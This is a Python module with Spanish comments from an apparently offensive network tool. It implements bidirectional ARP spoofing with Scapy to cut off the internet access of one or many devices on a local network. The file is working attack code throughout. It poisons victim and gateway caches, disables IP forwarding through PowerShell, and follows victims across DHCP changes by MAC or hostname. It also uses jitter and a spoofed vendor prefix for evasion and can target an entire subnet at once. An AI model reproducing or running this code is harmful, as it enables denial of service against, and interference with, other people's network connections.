"""
Módulo ARP - Spoofing bidireccional (víctima + gateway)

Objetivos admitidos:
  • IP fija       (ej. 192.168.1.50)
  • MAC de hardware (ej. AA:BB:CC:DD:EE:FF) — si la IP cambia (DHCP),
    se re-escanea la red en capa 2 y se sigue a la misma MAC.
    Pipeline de búsqueda: caché ARP → unicast → scan completo.
  • Hostname      (ej. iPhone.local) — se resuelve vía
    mDNS / NetBIOS / LLMNR en paralelo y se re-resuelve periódicamente.

Modos de ataque:
  • Single-target:  un solo objetivo (IP, MAC o hostname).
  • Multi-target:   múltiples objetivos simultáneamente (round-robin).
                    Acepta lista de IPs/MACs o "*" para toda la subred.

Mejoras del seguimiento dinámico:
  • Backoff adaptativo: escanea rápido cuando el objetivo acaba de
    cambiar de IP, y más lento cuando lleva rato estable.
  • Pipeline de 3 fases para MAC: caché → unicast → scan.
  • Detección de objetivo offline/online con notificaciones claras.
  • Información del fabricante (OUI) en la salida.
  • DHCP Sniffer pasivo: detecta cambios de IP instantáneamente
    escuchando paquetes DHCP ACK en la red.

Corte total de internet (mejoras v2):
  • Ataque BIDIRECCIONAL: se envenena tanto a la víctima como al
    gateway. La víctima envía su tráfico a nuestra MAC (no llega al
    gateway) y el gateway envía las respuestas a nuestra MAC (no
    llegan a la víctima). Resultado: corte TOTAL de internet.
  • IP forwarding desactivado: nos aseguramos de que nuestro equipo
    NO reenvíe tráfico entre víctima y gateway.
  • Ráfaga agresiva tras renovación DHCP: cuando la víctima obtiene
    IP nueva, envenenamos inmediatamente ambas direcciones.
  • Monitor reactivo bidireccional: vigila ARP requests de la víctima
    Y del gateway, re-envenenando ambos instantáneamente.

Opciones avanzadas:
  • Gratuitous ARP (GARP): broadcast que envenena toda la subred.
  • Verificación de efectividad: comprueba si la víctima sigue activa.
"""

import time
import random
import threading
import subprocess
import sys
from modulos.network_core import _obtener_mac, _mac_aleatoria, _scan_rango, _mac_propia
from modulos.discovery import (
    clasificar_objetivo, _resolver_objetivo, _buscar_ip_por_mac,
    _resolver_hostname, _normalizar_mac, _fabricante_mac,
    _buscar_ip_por_mac_cache, _buscar_ip_por_mac_rapido,
)
from modulos.system_utils import _is_admin
from modulos.config import _estado
import modulos.config as _cfg

# ── Intervalos del seguimiento dinámico ───────────────────────────────
_INTERVALO_MIN = 8       # Segundos mínimos entre re-escaneos (objetivo inestable)
_INTERVALO_NORMAL = 20   # Segundos normales (objetivo estable)
_INTERVALO_MAX = 45      # Segundos máximos (objetivo estable mucho tiempo)
_INTERVALO_OFFLINE = 10  # Segundos entre reintentos cuando el objetivo está offline

# ── Intervalos de verificación y GARP ─────────────────────────────────
_VERIFICAR_CADA = 10     # Cada cuántos paquetes verificar efectividad
_GARP_CADA = 5           # Cada cuántos paquetes enviar GARP broadcast


class ARPModule:
    """Módulo de ARP Spoofing con corte total de internet."""

    def __init__(self, logger_engine):
        self.logger = logger_engine
        self._ip_fwd_original = None  # Estado original del IP forwarding

    # ── Control de IP Forwarding ──────────────────────────────────────
    def _disable_ip_forwarding(self, write_callback):
        """Desactiva IP forwarding en Windows para no reenviar tráfico.

        Si nuestro equipo tiene IP forwarding activado, los paquetes
        de la víctima que llegan a nosotros serían reenviados al
        gateway real, permitiendo que la víctima mantenga internet.
        Desactivamos esto para asegurar un corte TOTAL.
        """
        if sys.platform != "win32":
            return

        try:
            # Guardar estado actual
            result = subprocess.run(
                ["powershell", "-Command",
                 "(Get-NetIPInterface | Where-Object {$_.Forwarding -eq 'Enabled'}).ifIndex"],
                capture_output=True, text=True, timeout=5,
                creationflags=0x08000000
            )
            self._ip_fwd_original = result.stdout.strip()

            # Desactivar forwarding en todas las interfaces
            subprocess.run(
                ["powershell", "-Command",
                 "Get-NetIPInterface | Set-NetIPInterface -Forwarding Disabled"],
                capture_output=True, timeout=5,
                creationflags=0x08000000
            )
            write_callback("  🔒 IP Forwarding desactivado (corte total)\n")
        except Exception:
            # No es crítico si falla — en la mayoría de PCs ya está desactivado
            pass

    def _restore_ip_forwarding(self, write_callback):
        """Restaura IP forwarding al estado original."""
        if sys.platform != "win32" or not self._ip_fwd_original:
            return

        try:
            for ifindex in self._ip_fwd_original.split('\n'):
                ifindex = ifindex.strip()
                if ifindex:
                    subprocess.run(
                        ["powershell", "-Command",
                         f"Set-NetIPInterface -InterfaceIndex {ifindex} -Forwarding Enabled"],
                        capture_output=True, timeout=5,
                        creationflags=0x08000000
                    )
            write_callback("  🔓 IP Forwarding restaurado\n")
        except Exception:
            pass
        self._ip_fwd_original = None

    def start_attack(self, objetivo, gateway, interval_base, stealth, jitter,
                     oui, seguimiento, write_callback, stop_callback, garp=False):
        """Inicia el ataque de ARP spoofing (single-target).

        Args:
            objetivo: IP, MAC de hardware o hostname del objetivo.
            seguimiento: si True, re-resuelve periódicamente el
                         objetivo para seguirlo si cambia de IP.
            garp: si True, envía Gratuitous ARP cada N iteraciones.
        """
        if not hasattr(self, '_scapy_available'):
            try:
                from scapy.all import Ether, ARP, sendp, sniff
                self._scapy_available = True
            except ImportError:
                self._scapy_available = False
                write_callback("✗ Scapy no disponible.\n")
                return False

        if not self._scapy_available:
            return False

        _estado["arp"].set()
        threading.Thread(
            target=self._arp_loop,
            args=(objetivo, gateway, interval_base, stealth, jitter,
                  oui, seguimiento, write_callback, stop_callback, garp),
            daemon=True
        ).start()
        return True

    # ── Multi-target ─────────────────────────────────────────────────
    def start_multi_attack(self, targets_list, gateway, interval_base,
                           stealth, jitter, oui, write_callback,
                           stop_callback, garp=False):
        """Inicia ataque ARP a múltiples objetivos simultáneamente.

        Args:
            targets_list: lista de IPs/MACs/hostnames, o "*" para
                          toda la subred (excluye gateway y propia IP).
            garp: si True, envía Gratuitous ARP broadcast periódicamente.
        """
        if not hasattr(self, '_scapy_available'):
            try:
                from scapy.all import Ether, ARP, sendp, sniff
                self._scapy_available = True
            except ImportError:
                self._scapy_available = False
                write_callback("✗ Scapy no disponible.\n")
                return False

        if not self._scapy_available:
            return False

        _estado["arp"].set()
        threading.Thread(
            target=self._multi_arp_loop,
            args=(targets_list, gateway, interval_base, stealth, jitter,
                  oui, write_callback, stop_callback, garp),
            daemon=True
        ).start()
        return True

    def stop_attack(self, write_callback):
        """Detiene el ataque de ARP spoofing."""
        _estado["arp"].clear()
        write_callback("● Deteniendo y restaurando ARP...\n")
        self.logger.log("[ARP] Ataque detenido.", "warn")

    def diagnosticar(self, objetivo, write_callback, done_callback=None):
        """Pre-resuelve un objetivo (IP/MAC/hostname) sin atacar.

        Muestra en la salida el modo detectado, la IP actual, la MAC,
        el método de resolución y el fabricante. Se ejecuta en un hilo propio.
        """
        def _run():
            write_callback(f"» Resolviendo objetivo '{objetivo}'...\n")
            write_callback("─" * 48 + "\n")
            modo = clasificar_objetivo(objetivo)
            if modo is None:
                write_callback("✗ Objetivo vacío.\n")
            elif modo == "ip":
                mac = _obtener_mac(objetivo)
                fab = _fabricante_mac(mac) if mac else "—"
                write_callback(f"  Modo:       IP fija\n")
                write_callback(f"  IP:         {objetivo}\n")
                write_callback(f"  MAC:        {mac or 'sin respuesta ARP'}\n")
                write_callback(f"  Fabricante: {fab}\n")
            elif modo == "mac":
                ip, metodo = _buscar_ip_por_mac(objetivo)
                fab = _fabricante_mac(objetivo)
                write_callback(f"  Modo:       MAC de hardware\n")
                write_callback(f"  MAC:        {_normalizar_mac(objetivo)}\n")
                write_callback(f"  Fabricante: {fab}\n")
                write_callback(f"  IP:         {ip or 'no encontrada en la subred'}\n")
                if ip:
                    write_callback(f"  Vía:        {metodo}\n")
                    write_callback(f"  ✔ La MAC responde actualmente en {ip}\n")
                else:
                    write_callback(f"  Pipeline: caché ARP → unicast → scan L2\n")
                    write_callback(f"  ⚠ Ningún método localizó la MAC.\n")
                    write_callback(f"    ¿Dispositivo apagado, fuera de rango o\n")
                    write_callback(f"    con aleatorización MAC activa?\n")
            else:
                ip, metodo = _resolver_hostname(objetivo)
                write_callback(f"  Modo:       Hostname (mDNS / NetBIOS / LLMNR)\n")
                write_callback(f"  Host:       {objetivo}\n")
                write_callback(f"  IP:         {ip or 'no resuelto'}\n")
                if ip:
                    mac = _obtener_mac(ip)
                    fab = _fabricante_mac(mac) if mac else "—"
                    write_callback(f"  Vía:        {metodo}\n")
                    write_callback(f"  MAC:        {mac or 'sin respuesta ARP'}\n")
                    write_callback(f"  Fabricante: {fab}\n")
                else:
                    write_callback(f"  Protocolos: mDNS + NetBIOS + LLMNR (paralelo)\n")
                    write_callback(f"  ⚠ No respondió a ningún protocolo.\n")
                    write_callback(f"    ¿Nombre correcto? ¿Misma subred?\n")
            write_callback("─" * 48 + "\n")
            if done_callback:
                done_callback()

        threading.Thread(target=_run, daemon=True).start()

    # ── Loop principal (single-target) ───────────────────────────────
    def _arp_loop(self, objetivo, gateway, interval_base, stealth, jitter,
                  oui, seguimiento, write_callback, stop_callback, garp=False):
        """Loop principal del ataque ARP.

        Técnica BIDIRECCIONAL (corte total):
          1. Se envenena a la VÍCTIMA → le decimos que el gateway
             está en nuestra MAC. La víctima envía su tráfico a
             nosotros → nosotros lo descartamos.
          2. Se envenena al GATEWAY → le decimos que la víctima
             está en nuestra MAC. El gateway envía las respuestas
             a nosotros → nosotros las descartamos.
          3. IP forwarding desactivado → no reenviamos nada.

          Resultado: la víctima NO puede enviar ni recibir NADA.
          Internet cortado COMPLETAMENTE en ambas direcciones.
        """
        try:
            from scapy.all import Ether, ARP, sendp
        except ImportError:
            return

        # Desactivar IP forwarding para corte total
        self._disable_ip_forwarding(write_callback)

        # Elegir MAC de ataque — SIEMPRE explícita, nunca None
        # Cuando es None, Scapy auto-rellena pero en Windows/Npcap puede
        # haber inconsistencias entre Ether.src y ARP.hwsrc.
        if oui != "ninguno":
            mac_src = _mac_aleatoria(oui)
        else:
            # Obtener la MAC real que Scapy usará en la interfaz activa
            try:
                from scapy.all import get_if_hwaddr, conf
                mac_src = get_if_hwaddr(conf.iface)
            except Exception:
                mac_src = _mac_propia()

        # ── Resolver objetivo (IP / MAC / hostname) ──────────────────
        write_callback("» Resolviendo objetivo...\n")
        info = _resolver_objetivo(objetivo)
        if not info or not info["ip"] or not info["mac"]:
            modo_txt = {"ip": "IP", "mac": "MAC", "host": "hostname"}.get(
                info["modo"] if info else None, "objetivo")
            write_callback(f"✗ No se pudo resolver el {modo_txt} '{objetivo}'.\n")
            if info and info["modo"] == "mac":
                write_callback("  Pipeline: caché ARP → unicast → scan L2\n"
                               "  La MAC no respondió en ninguna fase.\n"
                               "  ¿Dispositivo apagado, fuera de rango o\n"
                               "  con aleatorización MAC activa?\n")
            elif info and info["modo"] == "host":
                write_callback("  Protocolos: mDNS + NetBIOS + LLMNR (paralelo)\n"
                               "  No respondió a ningún protocolo.\n"
                               "  ¿Nombre correcto? ¿Misma subred?\n")
            else:
                write_callback("  ¿Npcap? ¿IP activa?\n")
            self.logger.log(f"[ARP] Error: sin resolución para {objetivo}", "err")
            self._restore_ip_forwarding(write_callback)
            stop_callback()
            return

        # Guardar MAC real del gateway ANTES de empezar (para el monitor)
        mac_gw_real = _obtener_mac(gateway)

        # Estado compartido (hilo de envío + monitor + seguimiento)
        fab = info.get("fabricante", _fabricante_mac(info["mac"]))
        estado = {
            "objetivo": objetivo,
            "modo": info["modo"],
            "ip": info["ip"],
            "mac": info["mac"],
            "fabricante": fab,
            "online": True,            # Visibilidad actual del objetivo
            "cambios_ip": 0,           # Contador de cambios de IP detectados
            "ultimo_cambio": 0.0,      # Timestamp del último cambio
            "mac_gw_real": mac_gw_real,  # MAC legítima del gateway
        }
        lock = threading.Lock()

        modos_txt = {
            "ip": "IP fija",
            "mac": f"MAC de hardware → {fab} (seguimiento L2)",
            "host": f"Hostname (mDNS / NetBIOS / LLMNR)",
        }
        write_callback(f"» Objeto:  {objetivo}  [{modos_txt[estado['modo']]}]\n")
        write_callback(f"» Target:  {estado['ip']}  ({estado['mac']})\n")
        if fab != "Desconocido" and fab != "—":
            write_callback(f"» Vendor:  {fab}\n")
        write_callback(f"» Gateway: {gateway}  ({mac_gw_real or '?'})\n")
        write_callback(f"» MAC src: {mac_src}  [evasión OUI: {oui}]\n")
        if seguimiento and estado["modo"] != "ip":
            write_callback(f"» Seguimiento dinámico: adaptativo ({_INTERVALO_MIN}-{_INTERVALO_MAX}s)\n")
            if estado["modo"] == "mac":
                write_callback(f"  Pipeline: caché ARP → unicast → scan L2\n")
            else:
                write_callback(f"  Protocolos: mDNS + NetBIOS + LLMNR (paralelo)\n")
        write_callback(f"» Modo: BIDIRECCIONAL — víctima + gateway envenenados\n")
        write_callback(f"» IP Forwarding: desactivado (sin reenvío de tráfico)\n")
        if garp:
            write_callback(f"» GARP: activado — broadcast cada {_GARP_CADA} pkts\n")
        write_callback(f"» Resultado: víctima SIN internet TOTAL / tú CON internet\n")
        write_callback("─" * 48 + "\n")
        self.logger.log(f"[ARP] Iniciado BIDIRECCIONAL → {objetivo} ({estado['ip']})", "warn")

        try:
            # ── Paquete ARP víctima: le dice que el gateway está en mac_src
            # La víctima envía todo su tráfico a nosotros → lo descartamos
            def _construir_pkt_victima(ip_dst, mac_dst):
                return (Ether(src=mac_src, dst=mac_dst) /
                        ARP(pdst=ip_dst, hwdst=mac_dst,
                            psrc=gateway, hwsrc=mac_src, op=2))

            # ── Paquete ARP gateway: le dice que la víctima está en mac_src
            # El gateway envía respuestas a nosotros → las descartamos
            def _construir_pkt_gateway(ip_victima, mac_gw):
                if not mac_gw:
                    return None
                return (Ether(src=mac_src, dst=mac_gw) /
                        ARP(pdst=gateway, hwdst=mac_gw,
                            psrc=ip_victima, hwsrc=mac_src, op=2))

            # ── Seguimiento dinámico (IPs cambiantes) ──────────────────
            if seguimiento and estado["modo"] != "ip":
                threading.Thread(
                    target=self._seguimiento_loop,
                    args=(estado, lock, gateway, mac_src, write_callback),
                    daemon=True
                ).start()

                # ── DHCP Sniffer pasivo (complementa al polling) ───────
                threading.Thread(
                    target=self._dhcp_watcher,
                    args=(estado, lock, gateway, mac_src, write_callback),
                    daemon=True
                ).start()

            # ── Monitor reactivo ARP BIDIRECCIONAL ────────────────────
            threading.Thread(
                target=self._arp_monitor,
                args=(estado, lock, gateway, mac_src, write_callback),
                daemon=True
            ).start()

            # ── RÁFAGA INICIAL — envenenar rápido ─────────────────────
            # Enviar 8 paquetes seguidos en AMBAS direcciones para
            # asegurar que la caché ARP de víctima Y gateway se
            # envenenen ANTES de que puedan comunicarse.
            ip_act, mac_act = estado["ip"], estado["mac"]
            write_callback("  ⚡ Ráfaga inicial BIDIRECCIONAL (8×2 pkts)...\n")
            for _ in range(8):
                # Envenenar víctima
                sendp(_construir_pkt_victima(ip_act, mac_act), verbose=0)
                # Envenenar gateway
                pkt_gw = _construir_pkt_gateway(ip_act, mac_gw_real)
                if pkt_gw:
                    sendp(pkt_gw, verbose=0)
                time.sleep(0.04)  # 40ms entre cada par
            write_callback("  ✔ Caché ARP envenenada (víctima + gateway)\n")

            # ── Bucle de envío ARP BIDIRECCIONAL ──────────────────────
            n = 8  # Ya enviamos 8 pares en la ráfaga
            while _estado["arp"].is_set():
                with lock:
                    ip_act, mac_act = estado["ip"], estado["mac"]
                    online = estado["online"]
                    current_mac_gw = estado["mac_gw_real"]

                if not online:
                    # Objetivo offline: no enviar paquetes, solo esperar
                    # Pero seguimos envenenando al gateway para que si
                    # la víctima vuelve, no tenga una ventana de internet
                    if current_mac_gw:
                        pkt_gw = _construir_pkt_gateway(ip_act, current_mac_gw)
                        if pkt_gw:
                            sendp(pkt_gw, verbose=0)
                    time.sleep(2)
                    continue

                # Envenenar víctima
                sendp(_construir_pkt_victima(ip_act, mac_act), verbose=0)
                # Envenenar gateway
                pkt_gw = _construir_pkt_gateway(ip_act, current_mac_gw)
                if pkt_gw:
                    sendp(pkt_gw, verbose=0)

                n += 1
                write_callback(f"  ↗ pkt #{n:4d} → {ip_act} (↔ bidireccional)\n")
                self.logger.log(f"[ARP] #{n} pkts → {ip_act} (bidireccional)", "pkt")

                # ── Gratuitous ARP periódico ──────────────────────────
                if garp and n % _GARP_CADA == 0:
                    self._enviar_garp(gateway, mac_src, write_callback)

                # ── Verificar efectividad ─────────────────────────────
                # Usamos unicast directo en vez de broadcast, para no
                # provocar que el gateway responda con su MAC real
                if n % _VERIFICAR_CADA == 0:
                    ok = self._verificar_efectividad_unicast(
                        ip_act, mac_act
                    )
                    if ok:
                        write_callback("  ✔ Víctima activa — internet cortado\n")
                    else:
                        write_callback("  ⚠ Víctima no responde — ¿desconectada?\n")

                # Intervalo con jitter
                if stealth:
                    iv = random.uniform(interval_base * 0.6, interval_base * 1.8)
                elif jitter:
                    iv = interval_base + random.uniform(-0.5, 0.5)
                else:
                    iv = interval_base
                time.sleep(max(0.5, iv))

        except Exception as e:
            write_callback(f"✗ Error: {e}\n")
            self.logger.log(f"[ARP] Error: {e}", "err")
        finally:
            with lock:
                ip_final, mac_final = estado["ip"], estado["mac"]
            self._restore_arp(ip_final, gateway, mac_final, mac_gw_real, write_callback)
            # Restaurar IP forwarding
            self._restore_ip_forwarding(write_callback)
            # Resumen de la sesión
            with lock:
                cambios = estado["cambios_ip"]
            if cambios > 0:
                write_callback(f"📊 Cambios de IP detectados durante la sesión: {cambios}\n")
            stop_callback()

    # ── Loop multi-target ────────────────────────────────────────────
    def _multi_arp_loop(self, targets_list, gateway, interval_base,
                        stealth, jitter, oui, write_callback,
                        stop_callback, garp=False):
        """Loop de ataque ARP a múltiples objetivos (round-robin).

        Técnica BIDIRECCIONAL aplicada a N víctimas simultáneamente.
        Si targets_list es "*", escanea la subred y ataca a todos los
        dispositivos encontrados (excluyendo gateway y propia IP).
        """
        try:
            from scapy.all import Ether, ARP, sendp
        except ImportError:
            return

        # Desactivar IP forwarding para corte total
        self._disable_ip_forwarding(write_callback)

        # MAC de ataque — SIEMPRE explícita, nunca None
        if oui != "ninguno":
            mac_src = _mac_aleatoria(oui)
        else:
            try:
                from scapy.all import get_if_hwaddr, conf
                mac_src = get_if_hwaddr(conf.iface)
            except Exception:
                mac_src = _mac_propia()

        # MAC real del gateway (para el monitor reactivo)
        mac_gw_real = _obtener_mac(gateway)

        write_callback("» Modo multi-target BIDIRECCIONAL activado\n")
        write_callback("─" * 48 + "\n")

        # ── Descubrir targets ─────────────────────────────────────────
        targets = {}  # {ip: {"mac": ..., "fabricante": ..., "online": True}}

        if targets_list == "*":
            # Escanear toda la subred
            write_callback("» Escaneando subred para descubrir dispositivos...\n")
            from modulos.discovery import _subred_local
            rango = _subred_local()
            dispositivos = _scan_rango(rango, timeout=4)

            ip_local = _cfg.IP_LOCAL
            for ip, mac in dispositivos:
                if ip == gateway or ip == ip_local:
                    continue
                fab = _fabricante_mac(mac)
                targets[ip] = {
                    "mac": mac,
                    "fabricante": fab,
                    "online": True,
                }

            if not targets:
                write_callback("✗ No se encontraron dispositivos en la subred.\n")
                self.logger.log("[ARP Multi] Sin dispositivos.", "err")
                self._restore_ip_forwarding(write_callback)
                stop_callback()
                return
        else:
            # Lista manual de objetivos
            for obj in targets_list:
                obj = obj.strip()
                if not obj:
                    continue
                write_callback(f"» Resolviendo '{obj}'...\n")
                info = _resolver_objetivo(obj)
                if info and info["ip"] and info["mac"]:
                    fab = info.get("fabricante", _fabricante_mac(info["mac"]))
                    targets[info["ip"]] = {
                        "mac": info["mac"],
                        "fabricante": fab,
                        "online": True,
                    }
                    write_callback(f"  ✔ {info['ip']} ({info['mac']}) — {fab}\n")
                else:
                    write_callback(f"  ✗ No se pudo resolver '{obj}'\n")

            if not targets:
                write_callback("✗ Ningún objetivo pudo resolverse.\n")
                self.logger.log("[ARP Multi] Sin objetivos válidos.", "err")
                self._restore_ip_forwarding(write_callback)
                stop_callback()
                return

        # ── Mostrar resumen ───────────────────────────────────────────
        lock = threading.Lock()
        write_callback("─" * 48 + "\n")
        write_callback(f"» Atacando {len(targets)} dispositivo(s):\n")
        for ip, info in targets.items():
            fab = info["fabricante"]
            fab_txt = f" — {fab}" if fab != "Desconocido" else ""
            write_callback(f"  • {ip}  ({info['mac']}){fab_txt}\n")
        write_callback(f"» Gateway: {gateway}  ({mac_gw_real or '?'})\n")
        write_callback(f"» MAC src: {mac_src}  [OUI: {oui}]\n")
        write_callback(f"» Modo: BIDIRECCIONAL round-robin (corte total)\n")
        write_callback(f"» IP Forwarding: desactivado\n")
        if garp:
            write_callback(f"» GARP: activado — broadcast cada {_GARP_CADA} ciclos\n")
        write_callback(f"» Resultado: víctimas SIN internet TOTAL / tú CON internet\n")
        write_callback("─" * 48 + "\n")
        self.logger.log(
            f"[ARP Multi] Iniciado BIDIRECCIONAL → {len(targets)} víctimas", "warn"
        )

        # ── Monitor reactivo multi-target BIDIRECCIONAL ───────────────
        threading.Thread(
            target=self._arp_monitor_multi,
            args=(targets, lock, gateway, mac_src, mac_gw_real,
                  write_callback),
            daemon=True
        ).start()

        try:
            # ── Ráfaga inicial multi-target BIDIRECCIONAL ─────────────
            write_callback(f"  ⚡ Ráfaga inicial ({len(targets)} × 8×2 pkts)...\n")
            for ip, info in targets.items():
                for _ in range(8):
                    # Envenenar víctima
                    pkt_v = (Ether(src=mac_src, dst=info["mac"]) /
                             ARP(pdst=ip, hwdst=info["mac"],
                                 psrc=gateway, hwsrc=mac_src, op=2))
                    sendp(pkt_v, verbose=0)
                    # Envenenar gateway
                    if mac_gw_real:
                        pkt_g = (Ether(src=mac_src, dst=mac_gw_real) /
                                 ARP(pdst=gateway, hwdst=mac_gw_real,
                                     psrc=ip, hwsrc=mac_src, op=2))
                        sendp(pkt_g, verbose=0)
                    time.sleep(0.025)
            write_callback("  ✔ Cachés ARP envenenadas (víctimas + gateway)\n")

            n = len(targets) * 8  # Paquetes de la ráfaga
            ciclo = 0
            while _estado["arp"].is_set():
                ciclo += 1

                with lock:
                    ips_activos = [
                        (ip, info) for ip, info in targets.items()
                        if info["online"]
                    ]

                if not ips_activos:
                    # Aún así, seguir envenenando el gateway para
                    # todas las IPs por si las víctimas vuelven
                    if mac_gw_real:
                        with lock:
                            for ip, info in targets.items():
                                pkt_g = (Ether(src=mac_src, dst=mac_gw_real) /
                                         ARP(pdst=gateway, hwdst=mac_gw_real,
                                             psrc=ip, hwsrc=mac_src, op=2))
                                sendp(pkt_g, verbose=0)
                    time.sleep(2)
                    continue

                # Round-robin BIDIRECCIONAL: envenenar víctima + gateway
                for ip, info in ips_activos:
                    # Envenenar víctima
                    pkt_v = (Ether(src=mac_src, dst=info["mac"]) /
                             ARP(pdst=ip, hwdst=info["mac"],
                                 psrc=gateway, hwsrc=mac_src, op=2))
                    sendp(pkt_v, verbose=0)
                    # Envenenar gateway
                    if mac_gw_real:
                        pkt_g = (Ether(src=mac_src, dst=mac_gw_real) /
                                 ARP(pdst=gateway, hwdst=mac_gw_real,
                                     psrc=ip, hwsrc=mac_src, op=2))
                        sendp(pkt_g, verbose=0)
                    n += 1

                write_callback(
                    f"  ↗ ciclo #{ciclo:4d} → {len(ips_activos)} víctimas "
                    f"({n} pkts total) ↔ bidireccional\n"
                )
                self.logger.log(
                    f"[ARP Multi] ciclo #{ciclo} → {len(ips_activos)} víctimas",
                    "pkt"
                )

                # ── GARP periódico (más eficiente para multi-target) ──
                if garp and ciclo % _GARP_CADA == 0:
                    self._enviar_garp(gateway, mac_src, write_callback)

                # ── Verificar efectividad (muestra aleatoria) ─────────
                if ciclo % _VERIFICAR_CADA == 0 and ips_activos:
                    muestra = random.choice(ips_activos)
                    ok = self._verificar_efectividad(muestra[0])
                    if ok:
                        write_callback(
                            f"  ✔ {muestra[0]} activa — internet cortado\n"
                        )
                    else:
                        write_callback(
                            f"  ⚠ {muestra[0]} no responde — ¿desconectada?\n"
                        )

                # Intervalo
                if stealth:
                    iv = random.uniform(interval_base * 0.6, interval_base * 1.8)
                elif jitter:
                    iv = interval_base + random.uniform(-0.5, 0.5)
                else:
                    iv = interval_base
                time.sleep(max(0.5, iv))

        except Exception as e:
            write_callback(f"✗ Error: {e}\n")
            self.logger.log(f"[ARP Multi] Error: {e}", "err")
        finally:
            # Restaurar ARP de todas las víctimas Y del gateway
            write_callback(f"⟳ Restaurando ARP de {len(targets)} víctima(s) + gateway...\n")
            for ip, info in targets.items():
                self._restore_arp(ip, gateway, info["mac"], mac_gw_real, write_callback)
            write_callback(f"✔ Todas las tablas ARP restauradas.\n")
            # Restaurar IP forwarding
            self._restore_ip_forwarding(write_callback)
            stop_callback()

    # ── Seguimiento dinámico ──────────────────────────────────────────
    def _seguimiento_loop(self, estado, lock, gateway, mac_src, write_callback):
        """Re-resuelve periódicamente el objetivo para seguirlo
        aunque cambie de IP (DHCP / renovación de lease).

        Usa un intervalo adaptativo:
          - Rápido justo después de un cambio de IP (8s)
          - Normal cuando está estable (20s)
          - Lento cuando lleva mucho rato sin cambiar (45s)
          - Reintentos frecuentes cuando está offline (10s)

        Cuando detecta un cambio de IP, envía una RÁFAGA BIDIRECCIONAL
        inmediata para cortar internet en la nueva IP sin esperar al
        bucle principal.
        """
        try:
            from scapy.all import Ether, ARP, sendp
        except ImportError:
            return

        intervalo = _INTERVALO_NORMAL
        ciclos_estable = 0       # Cuántos ciclos sin cambio
        ciclos_offline = 0       # Cuántos ciclos offline consecutivos

        while _estado["arp"].is_set():
            time.sleep(intervalo)
            if not _estado["arp"].is_set():
                return

            with lock:
                modo = estado["modo"]
                ip_actual = estado["ip"]
                online = estado["online"]

            ip_nueva = None
            metodo_detalle = ""

            # ── Búsqueda según el modo ────────────────────────────────
            if modo == "mac":
                with lock:
                    mac_obj = estado["mac"]

                # Pipeline de 3 fases para MAC
                # Fase 1: caché ARP (instantáneo)
                from modulos.discovery import _buscar_ip_por_mac_cache
                ip_nueva = _buscar_ip_por_mac_cache(mac_obj)
                if ip_nueva:
                    metodo_detalle = "caché ARP"
                else:
                    # Fase 2: unicast a última IP conocida
                    from modulos.discovery import _buscar_ip_por_mac_rapido
                    ip_nueva = _buscar_ip_por_mac_rapido(mac_obj, ip_actual)
                    if ip_nueva:
                        metodo_detalle = "unicast ARP"
                    else:
                        # Fase 3: scan completo L2
                        from modulos.discovery import _buscar_ip_por_mac as _buscar_full
                        ip_nueva, met = _buscar_full(mac_obj)
                        if ip_nueva:
                            metodo_detalle = met or "scan L2"

            elif modo == "host":
                ip_nueva, met = _resolver_hostname(estado["objetivo"])
                metodo_detalle = met or ""

            # ── Evaluar resultado ─────────────────────────────────────
            if ip_nueva and ip_nueva != ip_actual:
                # ¡El objetivo cambió de IP!
                mac_nueva = _obtener_mac(ip_nueva) or estado["mac"]
                fab = _fabricante_mac(mac_nueva)
                with lock:
                    estado["ip"] = ip_nueva
                    estado["mac"] = mac_nueva
                    estado["fabricante"] = fab
                    estado["online"] = True
                    estado["cambios_ip"] += 1
                    estado["ultimo_cambio"] = time.time()
                    mac_gw = estado["mac_gw_real"]
                ciclos_estable = 0
                ciclos_offline = 0
                intervalo = _INTERVALO_MIN  # Escanear rápido tras cambio
                write_callback(
                    f"⚠ IP cambió: {ip_actual} → {ip_nueva} "
                    f"(vía {metodo_detalle})\n"
                )
                self.logger.log(
                    f"[ARP] Objetivo re-localizado: {ip_actual} → {ip_nueva} "
                    f"({metodo_detalle})", "warn"
                )

                # ── RÁFAGA BIDIRECCIONAL inmediata tras cambio de IP ──
                # Cortar internet en la nueva IP ANTES de que el bucle
                # principal envíe su siguiente paquete
                write_callback(f"  ⚡ Ráfaga BIDIRECCIONAL → nueva IP {ip_nueva}\n")
                for _ in range(10):
                    # Envenenar víctima
                    pkt_v = (Ether(src=mac_src, dst=mac_nueva) /
                             ARP(pdst=ip_nueva, hwdst=mac_nueva,
                                 psrc=gateway, hwsrc=mac_src, op=2))
                    sendp(pkt_v, verbose=0)
                    # Envenenar gateway
                    if mac_gw:
                        pkt_g = (Ether(src=mac_src, dst=mac_gw) /
                                 ARP(pdst=gateway, hwdst=mac_gw,
                                     psrc=ip_nueva, hwsrc=mac_src, op=2))
                        sendp(pkt_g, verbose=0)
                    time.sleep(0.03)
                write_callback(f"  ✔ Internet cortado en {ip_nueva}\n")

                # También envenenar la IP ANTIGUA en el gateway por si
                # el gateway aún tiene la ruta cacheada
                if mac_gw:
                    for _ in range(3):
                        pkt_old = (Ether(src=mac_src, dst=mac_gw) /
                                   ARP(pdst=gateway, hwdst=mac_gw,
                                       psrc=ip_actual, hwsrc=mac_src, op=2))
                        sendp(pkt_old, verbose=0)
                        time.sleep(0.03)

            elif ip_nueva and ip_nueva == ip_actual:
                # Sigue en la misma IP — estable
                if not online:
                    # Volvió a estar online
                    with lock:
                        estado["online"] = True
                        mac_act = estado["mac"]
                        mac_gw = estado["mac_gw_real"]
                    ciclos_offline = 0
                    write_callback(
                        f"✔ Objetivo de vuelta online en {ip_actual} "
                        f"(vía {metodo_detalle})\n"
                    )
                    self.logger.log(
                        f"[ARP] Objetivo online: {ip_actual}", "ok"
                    )
                    # Re-envenenar inmediatamente al volver online
                    write_callback(f"  ⚡ Re-envenenando bidireccional...\n")
                    for _ in range(8):
                        pkt_v = (Ether(src=mac_src, dst=mac_act) /
                                 ARP(pdst=ip_actual, hwdst=mac_act,
                                     psrc=gateway, hwsrc=mac_src, op=2))
                        sendp(pkt_v, verbose=0)
                        if mac_gw:
                            pkt_g = (Ether(src=mac_src, dst=mac_gw) /
                                     ARP(pdst=gateway, hwdst=mac_gw,
                                         psrc=ip_actual, hwsrc=mac_src, op=2))
                            sendp(pkt_g, verbose=0)
                        time.sleep(0.03)

                ciclos_estable += 1
                # Adaptar intervalo: más lento cuanto más estable
                if ciclos_estable > 10:
                    intervalo = _INTERVALO_MAX
                elif ciclos_estable > 3:
                    intervalo = _INTERVALO_NORMAL
                else:
                    intervalo = _INTERVALO_MIN

